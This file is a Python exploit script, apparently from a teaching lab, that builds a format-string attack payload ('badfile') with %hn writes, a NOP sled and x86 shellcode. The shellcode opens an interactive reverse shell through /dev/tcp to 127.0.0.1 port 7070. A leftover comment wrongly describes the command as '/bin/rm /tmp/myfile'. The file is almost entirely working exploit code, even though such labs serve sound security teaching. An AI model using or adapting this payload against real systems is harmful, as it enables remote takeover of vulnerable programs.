#!/usr/bin/env python3

#!/usr/bin/env python3
import struct

malicious_code= (
    # Push the command '/bin////bash' into stack (//// is equivalent to /)
    "\x31\xc0"                      # xorl %eax,%eax
    "\x50"                          # pushl %eax
    "\x68""bash"                    # pushl "bash"
    "\x68""////"                    # pushl "////"
    "\x68""/bin"                    # pushl "/bin"
    "\x89\xe3"                      # movl %esp, %ebx  

    # Push the 1st argument '-ccc' into stack (-ccc is equivalent to -c)
    "\x31\xc0"                      # xorl %eax,%eax
    "\x50"                          # pushl %eax
    "\x68""-ccc"                    # pushl "-ccc"
    "\x89\xe0"                      # movl %esp, %eax

    # Push the 2nd argument into the stack:
    #       '/bin/rm /tmp/myfile' 
    # Students need to use their own VM's IP address
    "\x31\xd2"                      # xorl %edx,%edx
    "\x52"                          # pushl %edx
    "\x68""    "
    "\x68""2>&1"
    "\x68"">&1 "
    "\x68""70 0"
    "\x68""1/70"
    "\x68""00.0"
    "\x68""000."
    "\x68""127."
    "\x68""tcp/"
    "\x68""dev/"
    "\x68"" > /"
    "\x68""h -i"
    "\x68""/bas"
    "\x68""/bin"
    "\x89\xe2"                      # movl %esp,%edx

    # Construct the argv[] array and set ecx
    "\x31\xc9"                      # xorl %ecx,%ecx
    "\x51"                          # pushl %ecx
    "\x52"                          # pushl %edx
    "\x50"                          # pushl %eax
    "\x53"                          # pushl %ebx
    "\x89\xe1"                      # movl %esp,%ecx  

    # Set edx to 0
    "\x31\xd2"                      #xorl %edx,%edx   

    # Invoke the system call
    "\x31\xc0"                      # xorl %eax,%eax
    "\xb0\x0b"                      # movb $0x0b,%al 
    "\xcd\x80"                      # int $0x80
).encode('latin-1')
# 0xbfffe6ab
# 0xbfffe750 + 0x50 + 0x990
content = struct.pack("<I", 0xbfffe6ac+0x990)
content += struct.pack("<I", 0xbfffe6ae+0x990)
content += b"%49143u%81$hn%12593u%80$hn"
content += b"\x90" * 1000 + malicious_code

f = open("badfile", "wb+")
f.write(content)
f.close()
